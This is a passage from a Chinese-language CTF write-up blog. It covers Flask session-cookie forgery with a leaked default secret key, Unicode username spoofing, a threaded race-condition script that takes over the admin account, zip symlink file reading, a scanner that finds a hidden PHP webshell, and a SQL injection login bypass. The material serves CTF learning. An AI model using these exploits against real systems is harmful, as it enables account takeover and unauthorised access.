exception'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> decompress:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            payload = zlib.decompress(payload)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> Exception(<span class=\"string\">'Could not zlib decompress the payload before '</span></span><br><span class=\"line\">                             <span class=\"string\">'decoding the payload'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> session_json_serializer.loads(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    print(decryption(sys.argv[<span class=\"number\">1</span>].encode()))</span><br></pre></td></tr></table></figure>\n\n<p>先注册一个普通账号进行登陆，得到cookie，经过脚本解密 <code>python3 py3-flask_session_decode.py cookie</code> 得到：</p>\n<pre><code>{\n&apos;_fresh&apos;: True, \n&apos;_id&apos;:b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d\n954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8\ne7168aa6e8f3&apos;, \n&apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, \n&apos;image&apos;: b&apos;TmDp&apos;, \n&apos;name&apos;: &apos;goya&apos;, \n&apos;user_id&apos;: &apos;10&apos;\n}</code></pre><p>通过源码我们看到这句话 <code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code> ，其中 <code>environ</code> 是一个字符串所对应环境的映像对象，例如 </p>\n<pre><code>&gt;&gt;&gt; os.environ[&apos;TEMP&apos;]\n&apos;C:\\\\Users\\\\*****\\\\AppData\\\\Local\\\\Temp&apos;</code></pre><p>当获取不到 <code>SECRET_KEY</code> 时就使用 <code>ckj123</code> 作为密钥，这里我们不确定是不是能获取到环境变量里的key，但是我们用 ckj123 先进行测试。</p>\n<p>利用搜到的脚本 <a href=\"https://github.com/noraj/flask-session-cookie-manager\">https://github.com/noraj/flask-session-cookie-manager</a> 修改 <code>name</code> 为 <code>admin</code> 来生成伪造的cookie：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python2 flask_session_cookie_manager2.py encode -s <span class=\"string\">\"ckj123\"</span> -t <span class=\"string\">\"&#123;'_fresh': True, '_id': b'bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3', 'csrf_token': b'b7b7b2574958167d3670aa0e5bf46e47b60d1e39', 'image': b'TmDp', 'name': 'admin', 'user_id': '10'&#125;\"</span></span><br></pre></td></tr></table></figure>\n\n<p>生成新 cookie：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.eJxNkEGPgjAQhf_KpmcPWPBC4kFSIZDMEE2xaS-ERQQKdRPUKBj_<span class=\"number\">-1</span>Y3WT1NMm_me2_mTvLDUJ0a4p-HSzUjebsn_p18fROfSJMYmEoHTbyQdDMCDxtbKTB5hWjtKhY7ysAcBYwqQoN6p3HqrsA3o2J9m_LaUTzsUp45iskb6NVN6pKqKNFy2mrksWVKFwz2wIHaXRd4PQfdtDBtDVDpoIhdKZTl9i1q8DCChdRNj9OaplHYoMk8pWFJHjNSnoZDfv7pquP7BL1vkcYj8tKxMbynnWJPq6CRPOhRJAaZ6pHZOR10ILIp3SxfuNYUdfVP2kXzdbn6U46FeQtSbM-F8F7C5VQNnx8EvrL9xy8gAnGJ.XcK0Ow<span class=\"number\">.1</span>V55Ih_Ip48Y5fgVUgbSNrQlWyU</span><br></pre></td></tr></table></figure>\n\n<p>此时我们替换已经登陆账号的 cookie 即可得到flag</p>\n<h3 id=\"unicode欺骗\"><a href=\"#unicode欺骗\" class=\"headerlink\" title=\"unicode欺骗\"></a>unicode欺骗</h3><p>看WP看到的另一种方法，挺有意思</p>\n<p>观察路由处的代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route('/register', methods = ['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">register</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> current_user.is_authenticated:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'index'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    form = RegisterForm()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">'POST'</span>:</span><br><span class=\"line\">        **name = strlower(form.username.data)**</span><br><span class=\"line\">        <span class=\"keyword\">if</span> session.get(<span class=\"string\">'image'</span>).lower() != form.verify_code.data.lower():</span><br><span class=\"line\">            flash(<span class=\"string\">'Wrong verify code.'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> render_template(<span class=\"string\">'register.html'</span>, title = <span class=\"string\">'register'</span>, form=form)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> User.query.filter_by(username = name).first():</span><br><span class=\"line\">            flash(<span class=\"string\">'The username has been registered'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'register'</span>))</span><br><span class=\"line\">        user = User(username=name)</span><br><span class=\"line\">        user.set_password(form.password.data)</span><br><span class=\"line\">        db.session.add(user)</span><br><span class=\"line\">        db.session.commit()</span><br><span class=\"line\">        flash(<span class=\"string\">'register successful'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'login'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'register.html'</span>, title = <span class=\"string\">'register'</span>, form = form)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/login', methods = ['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> current_user.is_authenticated:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'index'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    form = LoginForm()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">'POST'</span>:</span><br><span class=\"line\">        **name = strlower(form.username.data)**</span><br><span class=\"line\">        session[<span class=\"string\">'name'</span>] = name</span><br><span class=\"line\">        user = User.query.filter_by(username=name).first()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> user <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> user.check_password(form.password.data):</span><br><span class=\"line\">            flash(<span class=\"string\">'Invalid username or password'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'login'</span>))</span><br><span class=\"line\">        login_user(user, remember=form.remember_me.data)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'index'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'login.html'</span>, title = <span class=\"string\">'login'</span>, form = form)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> current_user.is_authenticated:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'login'</span>))</span><br><span class=\"line\">    form = NewpasswordForm()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">'POST'</span>:</span><br><span class=\"line\">        **name = strlower(session[<span class=\"string\">'name'</span>])**</span><br><span class=\"line\">        user = User.query.filter_by(username=name).first()</span><br><span class=\"line\">        user.set_password(form.newpassword.data)</span><br><span class=\"line\">        db.session.commit()</span><br><span class=\"line\">        flash(<span class=\"string\">'change successful'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'index'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'change.html'</span>, title = <span class=\"string\">'change'</span>, form = form)</span><br></pre></td></tr></table></figure>\n\n<p>python 已经有了自己的 lower() 函数不用，用了自己定义的 strlower() ，进到这个函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">strlower</span><span class=\"params\">(username)</span>:</span></span><br><span class=\"line\">    username = nodeprep.prepare(username)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> username</span><br></pre></td></tr></table></figure>\n\n<p>可以看到 <code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code> 这个函数来自 twisted ,而题目中 <code>Twisted==10.2.0</code> ,版本差距有点大。</p>\n<p>对于一些字符，<a href=\"https://unicode-table.com/en/search/?q=small+capital\" target=\"_blank\" rel=\"noopener\">https://unicode-table.com/en/search/?q=small+capital</a> 这个函数的作用就是</p>\n<pre><code>ᴀ -&gt; A -&gt; a</code></pre><p>我们在上面的网站上找到一个 <code>ā</code> ，然后注册 <code>ādmin</code> ,此时经过一次 <code>strlower()</code> 变为 <code>ADMIN</code> ，之后我们登陆 <code>ADMIN</code> ，再经过一次 <code>strlower()</code> 就成为了 <code>admin</code> 。</p>\n<h3 id=\"条件竞争\"><a href=\"#条件竞争\" class=\"headerlink\" title=\"条件竞争\"></a>条件竞争</h3><p>先注册一个用户然后开一个线程改密码，另一个线程使用 admin 登陆，在某一瞬间生成 admin 的session 时我们改密码的操作也到了，这时就可以修改密码了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exp.py</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span><span class=\"params\">(s, username, password)</span>:</span></span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">'username'</span>: username,</span><br><span class=\"line\">        <span class=\"string\">'password'</span>: password,</span><br><span class=\"line\">        <span class=\"string\">'submit'</span>: <span class=\"string\">''</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.post(<span class=\"string\">\"http://admin.2018.hctf.io/login\"</span>, data=data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">logout</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.get(<span class=\"string\">\"http://admin.2018.hctf.io/logout\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(s, newpassword)</span>:</span></span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">'newpassword'</span>:newpassword</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s.post(<span class=\"string\">\"http://admin.2018.hctf.io/change\"</span>, data=data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func1</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    login(s, <span class=\"string\">'skysec'</span>, <span class=\"string\">'skysec'</span>)</span><br><span class=\"line\">    change(s, <span class=\"string\">'skysec'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func2</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    logout(s)</span><br><span class=\"line\">    res = login(s, <span class=\"string\">'admin'</span>, <span class=\"string\">'skysec'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">'&lt;a href=\"/index\"&gt;/index&lt;/a&gt;'</span> <span class=\"keyword\">in</span> res.text:</span><br><span class=\"line\">        print(<span class=\"string\">'finish'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1000</span>):</span><br><span class=\"line\">        print(i)</span><br><span class=\"line\">        s = requests.Session()</span><br><span class=\"line\">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class=\"line\">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class=\"line\">        t1.start()</span><br><span class=\"line\">        t2.start()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"hide-and-seak\"><a href=\"#hide-and-seak\" class=\"headerlink\" title=\"hide_and_seak\"></a>hide_and_seak</h3><p><strong>zip软连接读取文件</strong></p>\n<p>Linux ln命令是一个非常重要命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接。   当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在 其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。</p>\n<p>Linux文件系统中，有所谓的链接(link)，我们可以将其视为档案的别名，而链接又可分为两种 : 硬链接(hard link)与软链接(symbolic link)，硬链接的意思是一个档案可以有多个名称，而软链接的方式则是产生一个特殊的档案，该档案的内容是指向另一个档案的位置。硬链接是存在同一个文件系统中，而软链接却可以跨越不同的文件系统。</p>\n<p>软链接：</p>\n<pre><code>1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式\n2.软链接可以 跨文件系统 ，硬链接不可以\n3.软链接可以对一个不存在的文件名进行链接\n4.软链接可以对目录进行链接</code></pre><p>硬链接：</p>\n<pre><code>1.硬链接，以文件副本的形式存在。但不占用实际空间。\n2.不允许给目录创建硬链接\n3.硬链接只有在同一个文件系统中才能创建</code></pre><p>我们尝试生成一个软连接</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/tmp# ln -s test.txt test</span><br><span class=\"line\">\t  ll</span><br><span class=\"line\">lrwxrwxrwx  1 root  root 8 11月  7 17:41 test -&gt; test.txt</span><br><span class=\"line\">-rw-r--r--  1 root  root12 11月  7 17:41 test.txt</span><br><span class=\"line\"></span><br><span class=\"line\">/tmp# cat test</span><br><span class=\"line\">hello world</span><br><span class=\"line\"></span><br><span class=\"line\">/tmp# cat test.txt</span><br><span class=\"line\">hello world</span><br></pre></td></tr></table></figure>\n\n<p>尝试读取文件内容：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r \"echo file_get_contents('test.txt');\"</span><br><span class=\"line\">hello world</span><br><span class=\"line\"></span><br><span class=\"line\">php -r \"echo file_get_contents('test');\"</span><br><span class=\"line\">hello world</span><br></pre></td></tr></table></figure>\n\n<p>然后我们尝试进行压缩 –symlinks 即生成软连接</p>\n<pre><code>zip --symlinks test.zip test</code></pre><h3 id=\"强网杯-高明的黑客\"><a href=\"#强网杯-高明的黑客\" class=\"headerlink\" title=\"强网杯-高明的黑客\"></a>强网杯-高明的黑客</h3><p>打开之后提示我们下载源码，下载完发现是一个有 3002 个php文件的文件夹。</p>\n<p>查看文件内容后发现代码难以阅读，做了很多混淆，但是里面充满了 <code>$_GET &amp; $_POST</code> 以及 <code>eval、exec、assert...</code> 可以看出来这应该藏了一个shell，我们要做的就是把可用的 shell 找出来</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> multiprocessing.dummy <span class=\"keyword\">import</span> Pool <span class=\"keyword\">as</span> ThreadPool</span><br><span class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</span><br><span class=\"line\"></span><br><span class=\"line\">target_path = []</span><br><span class=\"line\">path = <span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\高明的黑客\\www\\src\"</span></span><br><span class=\"line\">count = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> filename <span class=\"keyword\">in</span> os.listdir(path):</span><br><span class=\"line\">    <span class=\"comment\"># print(os.path.join(path, filename))</span></span><br><span class=\"line\">    target_path.append(filename)</span><br><span class=\"line\">    <span class=\"comment\"># count += 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># print(target_path)</span></span><br><span class=\"line\"><span class=\"comment\"># print(count)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(target)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># params = &#123;&#125;</span></span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\高明的黑客\\www\\src\\\\\"</span>+ target, <span class=\"string\">\"r\"</span>, encoding=<span class=\"string\">\"utf-8\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        text = f.read()</span><br><span class=\"line\">        Get = list(re.findall(<span class=\"string\">'\\$_GET\\[\\'(.*?)\\'\\]'</span>, text))  <span class=\"comment\"># 得到当前文件内所有的 GET 参数</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">        for param in Get:</span></span><br><span class=\"line\"><span class=\"string\">            params[param] = 'echo(\"2333\");'  # 将正则到的所有参数都加上参数</span></span><br><span class=\"line\"><span class=\"string\">        # print(params)</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> Get:</span><br><span class=\"line\">            url = <span class=\"string\">\"http://127.0.0.1/buu/src/\"</span></span><br><span class=\"line\">            new_url = <span class=\"string\">\"%s%s?%s=%s\"</span> % (url, target_path, i, <span class=\"string\">'echo \"2333\"'</span>)</span><br><span class=\"line\">            r = requests.get(new_url)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"2333\"</span> <span class=\"keyword\">in</span> r.text:  <span class=\"comment\"># 带参数访问后检查是否有参数输出</span></span><br><span class=\"line\">                print(<span class=\"string\">\"++++++++++++++++++++++++++++GET find it! in \"</span> + target_path)</span><br><span class=\"line\">                result.append(target_path)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                print(<span class=\"string\">\"GET No ! in \"</span> + target_path + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">                print(r.url + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">            r.close()</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">post</span><span class=\"params\">(target_path)</span>:</span></span><br><span class=\"line\">    data = &#123;&#125;</span><br><span class=\"line\">    result = []</span><br><span class=\"line\">    <span class=\"keyword\">with</span> open(<span class=\"string\">\"F:\\CTF-files\\BUUCTF\\WEB\\高明的黑客\\www\\src\\\\\"</span> + target_path, <span class=\"string\">\"r\"</span>, encoding=<span class=\"string\">\"utf-8\"</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        text = f.read()</span><br><span class=\"line\">        Get = list(re.findall(<span class=\"string\">'\\$_GET\\[\\'(.*?)\\'\\]'</span>, text))  <span class=\"comment\"># 得到当前文件内所有的 GET 参数</span></span><br><span class=\"line\">        <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">        for param in Get:</span></span><br><span class=\"line\"><span class=\"string\">            data[param] = 'print_r(\"2333\")'  # 将正则到的所有参数都加上参数</span></span><br><span class=\"line\"><span class=\"string\">        # print(params)</span></span><br><span class=\"line\"><span class=\"string\">        \"\"\"</span></span><br><span class=\"line\">        url = <span class=\"string\">\"http://127.0.0.1/buu/src/\"</span></span><br><span class=\"line\">        r = requests.post(url + target_path, data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"2333\"</span> <span class=\"keyword\">in</span> r.text:  <span class=\"comment\"># 带参数访问后检查是否有参数输出</span></span><br><span class=\"line\">            print(<span class=\"string\">\"++++++++++++++++++++++++++++POST find it! in \"</span> + target_path)</span><br><span class=\"line\">            result.append(target_path)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"POST No ! in \"</span> + target_path + <span class=\"string\">\"\\r\\n\"</span>)</span><br><span class=\"line\">        r.close()</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">t1 = datetime.now()</span><br><span class=\"line\"></span><br><span class=\"line\">pool = ThreadPool(processes=<span class=\"number\">20</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> target_path:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        results = pool.apply_async(get, i)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        print(e)</span><br><span class=\"line\">pool.close()</span><br><span class=\"line\">pool.join()</span><br><span class=\"line\"></span><br><span class=\"line\">print(<span class=\"string\">'Multiprocess Scanning Completed in  '</span>, datetime.now() - t1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    get(target_path)</span><br><span class=\"line\">    post(target_path)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>提取完所有的 <code>GET和POST</code> 参数之后放在本地访问，如果我们加的参数成功 <code>echo</code> 了，说明找到可用 shell ，随后 <code>cat /flag</code> 即可。</p>\n<h3 id=\"EasySQL\"><a href=\"#EasySQL\" class=\"headerlink\" title=\"EasySQL\"></a>EasySQL</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&apos; 123</span><br><span class=\"line\">to use near &apos;123&apos;&apos; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">1&apos; or 1=1   123</span><br><span class=\"line\">use near &apos; &apos; and password=&apos;123&apos; &apos; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">1&apos; or 1=1# 123</span><br></pre></td></tr></table></figure>\n\n<p>登陆就有flag.</p>\n<h3 id=\"Havefun\"><a href=\"#Havefun\" class=\"headerlink\" 